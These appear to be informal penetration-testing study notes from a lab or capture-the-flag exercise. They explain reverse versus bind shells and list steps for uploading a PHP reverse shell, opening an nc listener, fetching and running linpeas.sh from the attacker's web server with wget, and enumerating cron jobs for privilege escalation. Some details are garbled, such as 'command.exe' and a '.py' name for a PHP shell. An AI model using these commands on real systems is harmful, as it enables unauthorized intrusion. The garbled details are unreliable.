## Reverse shell vs Bind shell
Reverse shell 
A victim connects to us 


for linux we type -e /bin/sh 
for windows we type -e command.exe/cmd.exe 
95% times is used 



Bind Shell 


Where we send the payload, open the port and then we connect to machine 


 
To upload the Shell 
php reverse shell  
1st github link pentestmonkey  download php_reverse_shell.py 
gedit shell.php 
copy paste 
change IP 
set listner 
nc -nvlp 4444 

we got the shell uploaded but not root user 
whoami 
hostname 
locate 
ls 

so now we going to download Linpeas.sh  

Now we're going to host the web server by 
python3 -m http.server 80 

now we need to download this linpeas.sh in machine so we're going to download at 
cd /tmp 
pwd 
/tmp 
wget http://mymachineIP/linpeas.sh 
chmod 777 linpeas.sh 
./linpeas.sh 

now watchout for LEGEND 

ssh grimmie(admin user)@IPofvictimMac

google cronjob (learn)
crontab -l 
crontab -u root -l 
crontab -e 
systemctl list-timers
